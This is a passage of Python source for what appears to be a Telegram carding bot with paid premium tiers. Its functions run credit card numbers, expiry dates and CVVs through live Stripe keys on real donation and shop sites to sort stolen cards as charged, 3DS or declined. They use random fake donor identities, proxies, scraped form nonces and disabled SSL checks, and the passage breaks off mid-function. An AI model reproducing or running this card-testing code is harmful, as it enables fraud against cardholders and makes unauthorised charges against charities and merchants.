        c.execute('SELECT expires_at FROM user_premium WHERE user_id = ?', (user_id,))
        prem_row = c.fetchone()

        if prem_row and prem_row[0]:
            try:
                current_expiry = datetime.strptime(prem_row[0], '%Y-%m-%d %H:%M:%S')
                if current_expiry > datetime.now():
                    new_expiry = current_expiry + timedelta(days=duration_days)
                else:
                    new_expiry = datetime.now() + timedelta(days=duration_days)
            except:
                new_expiry = datetime.now() + timedelta(days=duration_days)
        else:
            new_expiry = datetime.now() + timedelta(days=duration_days)

        # Update key and user premium
        c.execute('UPDATE premium_keys SET is_used = 1, redeemed_by = ?, redeemed_at = CURRENT_TIMESTAMP WHERE key_code = ?',
                  (user_id, key_code))
        c.execute('INSERT OR REPLACE INTO user_premium (user_id, expires_at) VALUES (?, ?)',
                  (user_id, new_expiry.strftime('%Y-%m-%d %H:%M:%S')))
        c.execute('UPDATE users SET role = ? WHERE user_id = ?', ('premium', user_id))
        self.conn.commit()
        return True, new_expiry.strftime('%Y-%m-%d %H:%M:%S')

    def get_user_tier(self, user_id: int, username: str = None) -> str:
        """Get user tier: owner, premium, or free"""
        global OWNER_ID
        if OWNER_ID and user_id == OWNER_ID:
            return 'owner'

        # Also check by username
        if username and username.lower() == OWNER_USERNAME.lower():
            return 'owner'

        # Check stored username if not provided
        if not username:
            c = self.conn.cursor()
            c.execute('SELECT username FROM users WHERE user_id = ?', (user_id,))
            row = c.fetchone()
            if row and row[0] and row[0].lower() == OWNER_USERNAME.lower():
                return 'owner'

        c = self.conn.cursor()
        c.execute('SELECT expires_at FROM user_premium WHERE user_id = ?', (user_id,))
        row = c.fetchone()
        if row and row[0]:
            try:
                expiry = datetime.strptime(row[0], '%Y-%m-%d %H:%M:%S')
                if expiry > datetime.now():
                    return 'premium'
            except:
                pass
        return 'free'

    def get_premium_expiry(self, user_id: int) -> Optional[str]:
        """Get premium expiry date"""
        c = self.conn.cursor()
        c.execute('SELECT expires_at FROM user_premium WHERE user_id = ?', (user_id,))
        row = c.fetchone()
        return row[0] if row else None

    def is_premium(self, user_id: int) -> bool:
        """Check if user has active premium"""
        tier = self.get_user_tier(user_id)
        return tier == 'premium'

    def set_owner(self, user_id: int):
        """Set user as owner"""
        c = self.conn.cursor()
        c.execute('UPDATE users SET role = ? WHERE user_id = ?', ('owner', user_id))
        self.conn.commit()

    def get_all_keys(self, limit=20):
        """Get all generated keys"""
        c = self.conn.cursor()
        c.execute('''SELECT key_code, duration_days, is_used, redeemed_by, created_at
                     FROM premium_keys ORDER BY created_at DESC LIMIT ?''', (limit,))
        return c.fetchall()

    # ─────────────────── Proxy Methods ───────────────────

    def save_proxy(self, user_id: int, proxy_url: str, proxy_info: dict):
        """Save or update user proxy in database"""
        c = self.conn.cursor()
        c.execute('''INSERT OR REPLACE INTO user_proxies
                     (user_id, proxy_url, proxy_ip, proxy_country, proxy_country_code,
                      is_rotating, response_time, last_check, last_status, fail_count, created_at)
                     VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, 'LIVE', 0, CURRENT_TIMESTAMP)''',
                  (user_id, proxy_url, proxy_info.get('ip'), proxy_info.get('country'),
                   proxy_info.get('country_code'), 1 if proxy_info.get('is_rotating') else 0,
                   proxy_info.get('response_time', 0)))
        self.conn.commit()

    def get_user_proxy(self, user_id: int) -> Optional[dict]:
        """Get user proxy from database"""
        c = self.conn.cursor()
        c.execute('''SELECT proxy_url, proxy_ip, proxy_country, proxy_country_code,
                            is_rotating, response_time, last_check, last_status, fail_count
                     FROM user_proxies WHERE user_id = ?''', (user_id,))
        row = c.fetchone()
        if row:
            return {
                'url': row[0],
                'ip': row[1],
                'country': row[2],
                'country_code': row[3],
                'is_rotating': row[4] == 1,
                'response_time': row[5],
                'last_check': row[6],
                'last_status': row[7],
                'fail_count': row[8]
            }
        return None

    def get_proxy_url(self, user_id: int) -> Optional[str]:
        """Get just the proxy URL for a user"""
        c = self.conn.cursor()
        c.execute('SELECT proxy_url FROM user_proxies WHERE user_id = ?', (user_id,))
        row = c.fetchone()
        return row[0] if row else None

    def update_proxy_status(self, user_id: int, status: str, fail_count: int = None):
        """Update proxy status after health check"""
        c = self.conn.cursor()
        if fail_count is not None:
            c.execute('''UPDATE user_proxies SET last_status = ?, fail_count = ?,
                         last_check = CURRENT_TIMESTAMP WHERE user_id = ?''',
                      (status, fail_count, user_id))
        else:
            c.execute('''UPDATE user_proxies SET last_status = ?,
                         last_check = CURRENT_TIMESTAMP WHERE user_id = ?''',
                      (status, user_id))
        self.conn.commit()

    def increment_proxy_fail(self, user_id: int) -> int:
        """Increment fail count and return new count"""
        c = self.conn.cursor()
        c.execute('UPDATE user_proxies SET fail_count = fail_count + 1 WHERE user_id = ?', (user_id,))
        self.conn.commit()
        c.execute('SELECT fail_count FROM user_proxies WHERE user_id = ?', (user_id,))
        row = c.fetchone()
        return row[0] if row else 0

    def reset_proxy_fail(self, user_id: int):
        """Reset fail count on successful check"""
        c = self.conn.cursor()
        c.execute('''UPDATE user_proxies SET fail_count = 0, last_status = 'LIVE',
                     last_check = CURRENT_TIMESTAMP WHERE user_id = ?''', (user_id,))
        self.conn.commit()

    def delete_proxy(self, user_id: int) -> bool:
        """Delete user proxy"""
        c = self.conn.cursor()
        c.execute('DELETE FROM user_proxies WHERE user_id = ?', (user_id,))
        self.conn.commit()
        return c.rowcount > 0

    def get_all_proxies(self) -> List[tuple]:
        """Get all user proxies for health check"""
        c = self.conn.cursor()
        c.execute('''SELECT user_id, proxy_url, fail_count, last_check
                     FROM user_proxies ORDER BY last_check ASC''')
        return c.fetchall()

    def get_stale_proxies(self, minutes: int = 30) -> List[tuple]:
        """Get proxies that haven't been checked in X minutes"""
        c = self.conn.cursor()
        c.execute('''SELECT user_id, proxy_url, fail_count
                     FROM user_proxies
                     WHERE datetime(last_check) < datetime('now', ? || ' minutes')''',
                  (f'-{minutes}',))
        return c.fetchall()

# Initialize database
db = Database()

# Initialize hardcoded Stripe gates
db.init_stripe_gates()

# ═══════════════════════════════════════════════════════════════
#                       BIN LOOKUP
# ═══════════════════════════════════════════════════════════════

BIN_CACHE = {}

async def lookup_bin(bin_number: str) -> dict:
    """Lookup BIN information using antipublic API"""
    bin6 = bin_number[:6]

    if bin6 in BIN_CACHE:
        return BIN_CACHE[bin6]

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{BIN_API_URL}{bin6}", timeout=5) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result = {
                        'bin': bin6,
                        'brand': data.get('brand', 'Unknown').upper(),
                        'type': data.get('type', 'Unknown').upper(),
                        'level': data.get('level', 'Unknown'),
                        'bank': data.get('bank', 'Unknown'),
                        'country': data.get('country_name', 'Unknown'),
                        'country_code': data.get('country', 'XX'),
                        'emoji': data.get('country_flag', '')
                    }
                    BIN_CACHE[bin6] = result
                    return result
    except:
        pass

    # Fallback
    return {
        'bin': bin6,
        'brand': get_card_brand(bin_number),
        'type': 'UNKNOWN',
        'level': 'Unknown',
        'bank': 'Unknown',
        'country': 'Unknown',
        'country_code': 'XX',
        'emoji': ''
    }

# ═══════════════════════════════════════════════════════════════
#                    RATE LIMITING
# ═══════════════════════════════════════════════════════════════

user_last_check = {}
user_check_count = defaultdict(int)

def can_check(user_id: int) -> Tuple[bool, str]:
    """Check if user can make a check (rate limiting)"""
    now = time.time()

    # Cooldown check
    if user_id in user_last_check:
        elapsed = now - user_last_check[user_id]
        if elapsed < CHECK_COOLDOWN:
            remaining = CHECK_COOLDOWN - elapsed
            return False, f"Cooldown: Wait {remaining:.1f}s"

    return True, ""

def record_check(user_id: int):
    """Record a check for rate limiting"""
    user_last_check[user_id] = time.time()
    user_check_count[user_id] += 1

# ═══════════════════════════════════════════════════════════════
#                    BOT INITIALIZATION
# ═══════════════════════════════════════════════════════════════

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# ═══════════════════════════════════════════════════════════════
#                 STRIPE GATEWAY ENGINE
# ═══════════════════════════════════════════════════════════════

# Stripe configuration moved to line 2434+ to avoid duplicates
# ═══════════════════════════════════════════════════════════════
#                      STRIPE GATEWAY CHECKERS
# ═══════════════════════════════════════════════════════════════

# Max retries for all Stripe gates
STRIPE_MAX_RETRIES = 20

async def stripe_gate_with_retry(gate_func, card_data, proxy_url=None, debug=False):
    """
    Wrapper that adds retry logic to any Stripe gate function.
    Retries up to STRIPE_MAX_RETRIES times on ERROR status.
    Only returns when we get a definitive result (CHARGED/DECLINED/3DS).
    """
    start = time.time()

    for attempt in range(STRIPE_MAX_RETRIES):
        try:
            result = await gate_func(card_data, proxy_url, debug)

            # Check if we got a definitive result
            status = result.get('status', '')

            # These are definitive results - return immediately
            if status in ['CHARGED', 'DECLINED', '3DS', '2FACTOR', 'Approved ⇒ CCN']:
                return result
            if status.startswith('Approved'):
                return result
            if result.get('is_chargeable') is not None:  # Has definitive chargeability
                return result

            # ERROR or UNKNOWN status - retry
            if debug:
                print(f"[RETRY] Attempt {attempt + 1}/{STRIPE_MAX_RETRIES} - {status}: {result.get('message', '')}")

            await asyncio.sleep(1)

        except Exception as e:
            if debug:
                print(f"[RETRY] Attempt {attempt + 1}/{STRIPE_MAX_RETRIES} - Exception: {e}")
            await asyncio.sleep(1)

    # Max retries reached
    return {'success': False, 'status': 'DECLINED', 'message': 'MAX_RETRIES', 'is_chargeable': False, 'time': time.time() - start}

# ═══════════════════════════════════════════════════════════════
#                    GOFILE UPLOAD
# ═══════════════════════════════════════════════════════════════

async def upload_to_gofile(content: str, filename: str = "results.txt") -> dict:
    """Upload content to gofile.io and return download link"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.gofile.io/servers") as resp:
                server_data = await resp.json()
                servers = server_data.get("data", {}).get("servers", [])
                if not servers:
                    servers = server_data.get("data", {}).get("serversAllZone", [])
                if not servers:
                    return {"success": False, "error": "No servers available"}
                server = servers[0]["name"]
            
            form = aiohttp.FormData()
            form.add_field('file', content.encode('utf-8'), 
                          filename=filename, content_type='text/plain')
            
            async with session.post(f"https://{server}.gofile.io/uploadFile", data=form) as resp:
                result = await resp.json()
                if result.get("status") == "ok":
                    return {"success": True, "download_url": result["data"]["downloadPage"], "file_id": result["data"]["id"]}
                return {"success": False, "error": result.get("status", "Unknown error")}
    except Exception as e:
        return {"success": False, "error": str(e)[:50]}

# ═══════════════════════════════════════════════════════════════
#                    STR4 - DAVID MARAGA DONATION GATE
# ═══════════════════════════════════════════════════════════════

async def check_card_stripe_donation(card_data: dict, proxy_url: str = None, debug: bool = False) -> dict:
    """
    STR4 - David Maraga Stripe Donation Flow
    
    Flow:
    1. POST /api/payments to create payment intent
    2. Parse clientSecret and intentID
    3. POST to Stripe API to confirm payment
    4. Result: succeeded = CHARGED, requires_action = 3DS, else DECLINED
    """
    start = time.time()
    
    def log_debug(msg):
        if debug:
            print(f"[STR4] {msg}")
    
    try:
        cc = card_data['number']
        mm = card_data['month']
        yy = card_data['year']
        cvv = card_data['cvv']
        
        donor_name = ''.join(random.choices(string.ascii_uppercase, k=4))
        donor_email = f"{''.join(random.choices(string.ascii_lowercase, k=6))}@gmail.com"
        
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=60)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            
            # STEP 1: Create Payment Intent
            log_debug("Creating payment intent...")
            
            payment_payload = {
                "paymentMethod": "stripe",
                "amount": 3,
                "currency": "USD",
                "donorName": donor_name,
                "donorEmail": donor_email,
                "displayDonation": False,
                "donationType": "one-time",
                "isAnonymous": False
            }
            
            headers_create = {
                "Host": "donations.davidmaraga.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://donations.davidmaraga.com/",
                "Content-Type": "application/json",
                "Origin": "https://donations.davidmaraga.com",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin"
            }
            
            async with session.post(
                "https://donations.davidmaraga.com/api/payments",
                json=payment_payload,
                headers=headers_create,
                proxy=proxy_url,
                ssl=False
            ) as resp:
                create_text = await resp.text()
                log_debug(f"Create response: {create_text[:200]}")
                
                if resp.status != 200:
                    return {'success': False, 'status': 'ERROR', 'message': f'CREATE_FAILED_{resp.status}', 'is_chargeable': None, 'time': time.time() - start}
            
            # STEP 2: Parse clientSecret and intentID
            client_secret_match = re.search(r'"clientSecret":"([^"]+)"', create_text)
            intent_match = re.search(r'"clientSecret":"pi_([^_]+)_', create_text)
            
            if not client_secret_match or not intent_match:
                return {'success': False, 'status': 'ERROR', 'message': 'PARSE_FAILED', 'is_chargeable': None, 'time': time.time() - start}
            
            client_secret = client_secret_match.group(1)
            full_intent_id = f"pi_{intent_match.group(1)}"
            log_debug(f"intentID: {full_intent_id}")
            
            # STEP 3: Confirm Payment
            log_debug("Confirming payment...")
            
            confirm_data = (
                f"return_url=https%3A%2F%2Fdonations.davidmaraga.com%2Fdonation-success%3Fprovider%3Dstripe"
                f"&payment_method_data[type]=card"
                f"&payment_method_data[card][number]={cc}"
                f"&payment_method_data[card][cvc]={cvv}"
                f"&payment_method_data[card][exp_year]={yy}"
                f"&payment_method_data[card][exp_month]={mm}"
                f"&payment_method_data[billing_details][address][country]=PK"
                f"&payment_method_data[payment_user_agent]=stripe.js%2Feeaff566a9%3B+stripe-js-v3%2Feeaff566a9%3B+payment-element"
                f"&key=pk_live_51ReQIiKyyNbRBgGl4sd6Jq0A2GbUKQC0LieMLuxQvpEMccLtQtxTmemXZRRvRMNwiUyPlxYiTNX4ZmjSx8x32EsN00VOpOjKfb"
                f"&_stripe_version=2025-03-31.basil"
                f"&client_secret={client_secret}"
            )
            
            headers_confirm = {
                "Host": "api.stripe.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://js.stripe.com/",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site"
            }
            
            async with session.post(
                f"https://api.stripe.com/v1/payment_intents/{full_intent_id}/confirm",
                data=confirm_data,
                headers=headers_confirm,
                proxy=proxy_url,
                ssl=False
            ) as resp:
                confirm_text = await resp.text()
                log_debug(f"Confirm response: {confirm_text[:300]}")
            
            # STEP 4: Parse Result
            # succeeded = CHARGED
            if '"status":"succeeded"' in confirm_text or '"status": "succeeded"' in confirm_text:
                return {'success': True, 'status': 'CHARGED', 'message': 'PAYMENT_SUCCEEDED', 'is_chargeable': True, 'time': time.time() - start}
            
            # requires_action = 3DS
            if '"status":"requires_action"' in confirm_text or '"status": "requires_action"' in confirm_text:
                return {'success': False, 'status': '3DS', 'message': '3DS_REQUIRED', 'is_chargeable': True, 'time': time.time() - start}
            
            # Parse decline message
            message_match = re.search(r'"message":\s*"([^"]+)"', confirm_text)
            decline_code_match = re.search(r'"decline_code":\s*"([^"]+)"', confirm_text)
            decline_message = message_match.group(1) if message_match else "UNKNOWN_DECLINE"
            decline_code = decline_code_match.group(1) if decline_code_match else ""
            final_message = f"{decline_message} → {decline_code}" if decline_code else decline_message
            
            return {'success': False, 'status': 'DECLINED', 'message': final_message, 'is_chargeable': False, 'time': time.time() - start}
            
    except asyncio.TimeoutError:
        return {'success': False, 'status': 'ERROR', 'message': 'TIMEOUT', 'is_chargeable': None, 'time': time.time() - start}
    except Exception as e:
        log_debug(f"Exception: {e}")
        return {'success': False, 'status': 'ERROR', 'message': str(e)[:50], 'is_chargeable': None, 'time': time.time() - start}

async def check_card_stripe_auth(card_data: dict, proxy_url: str = None, debug: bool = False) -> dict:
    start = time.time()

    cc = card_data['number']
    mm = card_data['month']
    yy = card_data['year']
    if len(yy) == 2:
        yy_full = f"20{yy}"
    else:
        yy_full = yy
    cvv = card_data['cvv']

    rand_name = ''.join(random.choices(string.ascii_lowercase, k=6))
    rand_num = random.randint(10, 99)
    email = f"{rand_name}{rand_num}@gmail.com"

    BASE_URL = "https://www.propski.co.uk"
    PK_KEY = "pk_live_4kM0zYmj8RdKCEz9oaVNLhvl00GpRole3Q"

    ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=60)
    jar = aiohttp.CookieJar(unsafe=True)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout, cookie_jar=jar, headers={"User-Agent": ua}) as session:

            async with session.get(f"{BASE_URL}/my-account/", headers={"Referer": f"{BASE_URL}/my-account/"}, proxy=proxy_url, ssl=False) as r1:
                html1 = await r1.text()

            nonce_m = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', html1)
            if not nonce_m:
                return {'success': False, 'status': 'ERROR', 'message': 'REG_NONCE_FAIL', 'is_chargeable': None, 'time': time.time() - start}
            register_nonce = nonce_m.group(1)

            reg_data = {
                'email': email,
                'wc_order_attribution_session_entry': f'{BASE_URL}/my-account/',
                'wc_order_attribution_user_agent': ua,
                'woocommerce-register-nonce': register_nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            async with session.post(f"{BASE_URL}/my-account/", params={'action': 'register'}, data=reg_data, headers={"Referer": f"{BASE_URL}/my-account/"}, proxy=proxy_url, ssl=False) as r2:
                if r2.status not in (200, 302):
                    return {'success': False, 'status': 'ERROR', 'message': f'REG_FAIL_{r2.status}', 'is_chargeable': None, 'time': time.time() - start}

            addr_url = f"{BASE_URL}/my-account/edit-address/billing/"
            async with session.get(addr_url, headers={"Referer": f"{BASE_URL}/my-account/edit-address/"}, proxy=proxy_url, ssl=False) as r3:
                html3 = await r3.text()

            addr_nonce_m = re.search(r'name="woocommerce-edit-address-nonce" value="([^"]+)"', html3)
            if not addr_nonce_m:
                return {'success': False, 'status': 'ERROR', 'message': 'ADDR_NONCE_FAIL', 'is_chargeable': None, 'time': time.time() - start}
            addr_nonce = addr_nonce_m.group(1)

            addr_data = {
                'billing_first_name': 'Mama',
                'billing_last_name': 'Babbaw',
                'billing_company': '',
                'billing_country': 'AU',
                'billing_address_1': 'Street allen 45',
                'billing_address_2': '',
                'billing_city': 'New York',
                'billing_state': 'NSW',
                'billing_postcode': '10080',
                'billing_phone': '15525546325',
                'billing_email': email,
                'save_address': 'Save address',
                'woocommerce-edit-address-nonce': addr_nonce,
                '_wp_http_referer': '/my-account/edit-address/billing/',
                'action': 'edit_address',
            }
            async with session.post(addr_url, data=addr_data, headers={"Origin": BASE_URL, "Referer": addr_url}, proxy=proxy_url, ssl=False) as r4:
                if r4.status not in (200, 302):
                    return {'success': False, 'status': 'ERROR', 'message': f'ADDR_FAIL_{r4.status}', 'is_chargeable': None, 'time': time.time() - start}

            pm_url = f"{BASE_URL}/my-account/add-payment-method/"
            async with session.get(pm_url, headers={"Referer": f"{BASE_URL}/my-account/payment-methods/"}, proxy=proxy_url, ssl=False) as r5:
                html5 = await r5.text()

            add_nonce_m = re.search(r'"add_card_nonce"\s*:\s*"([^"]+)"', html5)
            if not add_nonce_m:
                return {'success': False, 'status': 'ERROR', 'message': 'ADD_NONCE_FAIL', 'is_chargeable': None, 'time': time.time() - start}
            add_card_nonce = add_nonce_m.group(1)

            stripe_data = {
                "referrer": BASE_URL,
                "type": "card",
                "owner[email]": email,
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_month]": mm,
                "card[exp_year]": yy_full,
                "guid": "5f072a89-96d0-4d98-9c15-e2120acb9f6385f761",
                "muid": "2e70679e-a504-4e9c-ad79-a9bcf27bc72a6b90d5",
                "sid": "18d15059-63f6-4de6-b243-999e709ea0725ea079",
                "pasted_fields": "number",
                "payment_user_agent": "stripe.js/8702d4c73a; stripe-js-v3/8702d4c73a; split-card-element",
                "time_on_page": "36611",
                "client_attribution_metadata[client_session_id]": "a36626e3-53c5-4045-9c7c-d9a4bb30ffd7",
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "cardNumber",
                "client_attribution_metadata[merchant_integration_version]": "2017",
                "key": PK_KEY
            }
            stripe_headers = {
                "authority": "api.stripe.com",
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "pragma": "no-cache",
                "referer": "https://js.stripe.com/",
                "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": ua,
            }
            async with session.post("https://api.stripe.com/v1/sources", data=stripe_data, headers=stripe_headers, proxy=proxy_url, ssl=False) as r6:
                stripe_text = await r6.text()
                try:
                    stripe_json = await r6.json(content_type=None)
                except Exception:
                    stripe_json = None

            if not stripe_json or 'id' not in stripe_json:
                err_m = re.search(r'"message":\s*"([^"]+)"', stripe_text)
                err_msg = err_m.group(1) if err_m else "PM_CREATE_FAIL"
                return {'success': False, 'status': 'DECLINED', 'message': err_msg, 'is_chargeable': False, 'time': time.time() - start}

            pmid = stripe_json['id']

            attach_params = {'wc-ajax': 'wc_stripe_create_setup_intent'}
            attach_data = {'stripe_source_id': pmid, 'nonce': add_card_nonce}
            attach_headers = {
                "authority": "www.propski.co.uk",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": ua,
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": BASE_URL,
                "referer": f"{BASE_URL}/my-account/add-payment-method/",
            }
            async with session.post(f"{BASE_URL}/", params=attach_params, data=attach_data, headers=attach_headers, proxy=proxy_url, ssl=False) as r7:
                attach_status = r7.status
                try:
                    attach_json = await r7.json(content_type=None)
                except Exception:
                    attach_json = None

            if attach_status == 200 and attach_json:
                status_val = attach_json.get("status")
                if status_val == "success":
                    return {'success': True, 'status': 'APPROVED', 'message': 'PaymentMethod successfully added', 'is_chargeable': True, 'time': time.time() - start}
                elif status_val == "requires_action":
                    return {'success': False, 'status': '3DS', 'message': '3DS_REQUIRED', 'is_chargeable': True, 'time': time.time() - start}
                elif status_val == "error":
                    err = attach_json.get("error", {})
                    err_msg = err.get("message", "Unknown error") if isinstance(err, dict) else str(err)
                    return {'success': False, 'status': 'DECLINED', 'message': err_msg, 'is_chargeable': False, 'time': time.time() - start}
                else:
                    return {'success': False, 'status': 'DECLINED', 'message': f'status_{status_val}', 'is_chargeable': False, 'time': time.time() - start}
            elif attach_status == 400 and attach_json:
                err_msg = attach_json.get("data", {}).get("error", {}).get("message", "Declined")
                return {'success': False, 'status': 'DECLINED', 'message': err_msg, 'is_chargeable': False, 'time': time.time() - start}
            else:
                return {'success': False, 'status': 'ERROR', 'message': f'ATTACH_{attach_status}', 'is_chargeable': None, 'time': time.time() - start}

    except asyncio.TimeoutError:
        return {'success': False, 'status': 'ERROR', 'message': 'TIMEOUT', 'is_chargeable': None, 'time': time.time() - start}
    except Exception as e:
        return {'success': False, 'status': 'ERROR', 'message': str(e)[:50], 'is_chargeable': None, 'time': time.time() - start}

async def check_card_stripe_dollar(card_data: dict, proxy_url: str = None, debug: bool = False) -> dict:
    start = time.time()

    cc = card_data['number']
    mm = card_data['month']
    yy = card_data['year']
    yy_full = f"20{yy}" if len(yy) == 2 else yy
    cvv = card_data['cvv']

    STRIPE_KEY_5 = "pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e"
    STRIPE_ACCOUNT_5 = "acct_1LwocDFHMGxIu0Ep"
    MERCHANT_BASE_5 = "https://www.onamissionkc.org"

    static_cookies = {
        "crumb": "BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1",
        "ss_cvr": "b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1",
        "ss_cvt": "1760724937850",
        "__stripe_mid": "3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48",
        "__stripe_sid": "9d45db81-2d1e-436a-b832-acc8b6abac4814eb67",
    }
    crumb = static_cookies["crumb"]

    cart_headers_5 = {
        "authority": "www.onamissionkc.org",
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://www.onamissionkc.org",
        "referer": "https://www.onamissionkc.org/donate-now",
        "sec-ch-ua": '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "Android",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
    }

    stripe_headers_5 = {
        "authority": "api.stripe.com",
        "accept": "application/json",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "Android",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    }

    order_headers_5 = {
        "authority": "www.onamissionkc.org",
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://www.onamissionkc.org",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "Android",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "x-csrf-token": crumb,
    }

    cart_payload = json.dumps({
        "amount": {"value": 100, "currencyCode": "USD"},
        "donationFrequency": "ONE_TIME",
        "feeAmount": None,
    })

    stripe_data_5 = {
        "billing_details[address][city]": "Oakford",
        "billing_details[address][country]": "US",
        "billing_details[address][line1]": "Siles Avenue",
        "billing_details[address][line2]": "",
        "billing_details[address][postal_code]": "19053",
        "billing_details[address][state]": "PA",
        "billing_details[name]": "Geroge Washintonne",
        "billing_details[email]": "grogeh@gmail.com",
        "type": "card",
        "allow_redisplay": "unspecified",
        "payment_user_agent": "stripe.js/5445b56991; stripe-js-v3/5445b56991; payment-element; deferred-intent",
        "referrer": "https://www.onamissionkc.org",
        "time_on_page": "145592",
        "client_attribution_metadata[client_session_id]": "22e7d0ec-db3e-4724-98d2-a1985fc4472a",
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
        "client_attribution_metadata[elements_session_config_id]": "7904f40e-9588-48b2-bc6b-fb88e0ef71d5",
        "guid": "18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd",
        "muid": "3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48",
        "sid": "9d45db81-2d1e-436a-b832-acc8b6abac4814eb67",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_year]": yy_full,
        "card[exp_month]": mm,
        "key": STRIPE_KEY_5,
        "_stripe_account": STRIPE_ACCOUNT_5,
    }

    order_base_5 = {
        "email": "grogeh@gmail.com",
        "subscribeToList": False,
        "shippingAddress": {"id": "", "firstName": "", "lastName": "", "line1": "", "line2": "", "city": "", "region": "NY", "postalCode": "", "country": "", "phoneNumber": ""},
        "createNewUser": False,
        "newUserPassword": None,
        "saveShippingAddress": False,
        "makeDefaultShippingAddress": False,
        "customFormData": None,
        "shippingAddressId": None,
        "proposedAmountDue": {"decimalValue": "1", "currencyCode": "USD"},
        "billToShippingAddress": False,
        "billingAddress": {"id": "", "firstName": "Davide", "lastName": "Washintonne", "line1": "Siles Avenue", "line2": "", "city": "Oakford", "region": "PA", "postalCode": "19053", "country": "US", "phoneNumber": "+1361643646"},
        "savePaymentInfo": False,
        "makeDefaultPayment": False,
        "paymentCardId": None,
        "universalPaymentElementEnabled": True,
    }

    cart_url_5 = f"{MERCHANT_BASE_5}/api/v1/fund-service/websites/62fc11be71fa7a1da8ed62f8/donations/funds/6acfdbc6-2deb-42a5-bdf2-390f9ac5bc7b"

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=60)

    try:
